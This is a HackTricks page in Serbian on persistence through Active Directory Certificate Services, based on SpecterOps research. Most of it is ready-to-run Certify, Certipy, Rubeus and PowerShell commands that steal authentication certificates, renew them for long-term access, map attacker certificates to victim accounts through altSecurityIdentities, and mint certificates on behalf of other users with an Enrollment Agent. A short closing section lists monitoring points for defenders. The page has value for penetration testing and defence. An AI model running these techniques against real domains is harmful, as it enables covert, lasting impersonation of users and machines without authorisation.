# AD CS Perzistencija naloga

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je kratak rezime poglavlja o perzistenciji naloga iz odličnog istraživanja sa [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Razumevanje krađe akreditiva aktivnog korisnika pomoću sertifikata – PERSIST1

U scenariju gde korisnik može da zahteva sertifikat koji omogućava autentifikaciju u domenu, napadač ima priliku da zatraži i ukrade taj sertifikat kako bi održao perzistenciju na mreži. Po defaultu, `User` template u Active Directory dozvoljava takve zahteve, iako je ponekad može biti onemogućen.

Korišćenjem [Certify](https://github.com/GhostPack/Certify) ili [Certipy](https://github.com/ly4k/Certipy), možete pretražiti omogućene template-ove koji dozvoljavaju autentifikaciju klijenta i zatim zatražiti jedan:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Snaga sertifikata leži u njegovoj sposobnosti da se autentifikuje kao korisnik kome pripada, bez obzira na promene lozinke, dokle god je sertifikat važeći.

Možete konvertovati PEM u PFX i koristiti ga da biste dobili TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Napomena: U kombinaciji sa drugim tehnikama (pogledajte THEFT sekcije), autentifikacija zasnovana na sertifikatima omogućava trajni pristup bez dodirivanja LSASS i čak iz konteksta bez povišenih privilegija.

## Dobijanje mašinske perzistencije pomoću sertifikata - PERSIST2

Ako napadač ima povišene privilegije na hostu, može registrovati mašinski nalog kompromitovanog sistema za sertifikat koristeći podrazumevani `Machine` template. Autentifikacija kao mašina omogućava S4U2Self za lokalne servise i može obezbediti trajnu perzistenciju na hostu:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Produženje perzistencije putem obnavljanja sertifikata - PERSIST3

Zloupotreba perioda važenja i obnove šablona sertifikata omogućava napadaču da zadrži dugoročni pristup. Ako posedujete ranije izdat sertifikat i njegov privatni ključ, možete ga obnoviti pre isteka kako biste dobili nov, dugotrajan kredencijal bez ostavljanja dodatnih tragova zahteva povezanih sa originalnim nalogom.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operativni savet: Pratite rokove važnosti PFX fajlova koje poseduje napadač i obnavljajte ih na vreme. Obnova može takođe uzrokovati da ažurirani sertifikati sadrže modernu SID mapping ekstenziju, čineći ih upotrebljivim pod strožijim DC pravilima mapiranja (vidi sledeći odeljak).

## Postavljanje eksplicitnih mapiranja sertifikata (altSecurityIdentities) – PERSIST4

Ako možete da pišete u `altSecurityIdentities` atribut ciljnog naloga, možete eksplicitno mapirati sertifikat kojim kontroliše napadač na taj nalog. Ovo ostaje važeće i nakon promene lozinke i, kada se koriste snažni formati mapiranja, ostaje funkcionalno pod modernom DC primenom pravila.

Opšti tok:

1. Nabavite ili izdate client-auth sertifikat koji kontrolišete (npr. enroll `User` template kao vi sami).
2. Ekstrahujte snažan identifikator iz sertifikata (Issuer+Serial, SKI, ili SHA1-PublicKey).
3. Dodajte eksplicitno mapiranje u `altSecurityIdentities` naloga žrtve koristeći taj identifikator.
4. Autentifikujte se svojim sertifikatom; DC će ga mapirati na žrtvu preko eksplicitnog mapiranja.

Primer (PowerShell) koristeći snažno Issuer+Serial mapiranje:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Zatim se autentifikujte pomoću vašeg PFX-a. Certipy će direktno pribaviti TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Building Strong `altSecurityIdentities` Mappings

U praksi, **Issuer+Serial** i **SKI** mapiranja su najlakši jaki formati za izgradnju iz sertifikata koji je u posedu napadača. Ovo postaje bitno nakon **February 11, 2025**, kada DCs podrazumevano prelaze na **Full Enforcement** i slaba mapiranja prestaju biti pouzdana.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Koristite samo jake tipove mapiranja: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Slabi formati (Subject/Issuer, Subject-only, RFC822 email) su zastareli i mogu biti blokirani politikom DC-a.
- Mapiranje funkcioniše i za **user** i za **computer** objekte, pa je pravo pisanja na `altSecurityIdentities` naloga računara dovoljno da se perzistira kao ta mašina.
- Lanac sertifikata mora da se izgradi do root-a kojem DC veruje. Enterprise CAs u NTAuth obično su poverljivi; neka okruženja takođe veruju javnim CA.
- Schannel autentifikacija ostaje korisna za perzistenciju čak i kada PKINIT zakaže zato što DC nema Smart Card Logon EKU ili vraća `KDC_ERR_PADATA_TYPE_NOSUPP`.

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Ako dobijete validan Certificate Request Agent/Enrollment Agent sertifikat, možete po volji kreirati nove sertifikate sposobne za logon u ime korisnika i čuvati agent PFX offline kao token za perzistenciju. Tok zloupotrebe:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Opoziv agentovog sertifikata ili dozvola na šablonu je neophodan za uklanjanje ove perzistencije.

Operativne napomene
- Modern `Certipy` verzije podržavaju i `-on-behalf-of` i `-renew`, tako da napadač koji poseduje Enrollment Agent PFX može izdati i kasnije obnoviti krajnje sertifikate bez ponovnog diranja u originalni ciljni nalog.
- Ako PKINIT-bazirano preuzimanje TGT-a nije moguće, dobijeni on-behalf-of sertifikat i dalje se može koristiti za Schannel autentifikaciju sa `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Stroža primena mapiranja sertifikata: Uticaj na perzistenciju

Microsoft KB5014754 je uveo Strong Certificate Mapping Enforcement na domain controller-ima. Od 11. februara 2025. DC-ovi podrazumevano koriste Full Enforcement, odbijajući slaba/nejasna mapiranja. Praktične implikacije:

- Sertifikati izdati pre 2022. koji nemaju SID mapping ekstenziju mogu propasti pri implicitnom mapiranju kada su DC-ovi u Full Enforcement. Napadači mogu održati pristup ili obnavljanjem sertifikata preko AD CS (da bi dobili SID ekstenziju) ili postavljanjem jakog eksplicitnog mapiranja u `altSecurityIdentities` (PERSIST4).
- Eksplicitna mapiranja koristeći jake formate (Issuer+Serial, SKI, SHA1-PublicKey) i dalje funkcionišu. Slabi formati (Issuer/Subject, Subject-only, RFC822) mogu biti blokirani i treba ih izbegavati za perzistenciju.

Administratori bi trebalo da nadgledaju i postave upozorenja za:
- Promene na `altSecurityIdentities` i izdavanje/obnavljanje Enrollment Agent i User sertifikata.
- CA logove izdavanja za on-behalf-of zahteve i neuobičajene obrasce obnavljanja.

## Reference

- Microsoft. KB5014754: Promene u autentifikaciji zasnovanoj na sertifikatima na Windows domain controller-ima (vremenski okvir sprovođenja i stroga mapiranja).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (eksplicitna zloupotreba `altSecurityIdentities` na korisničkim/računarskim objektima).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Autentifikacija pomoću sertifikata kada PKINIT nije podržan.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
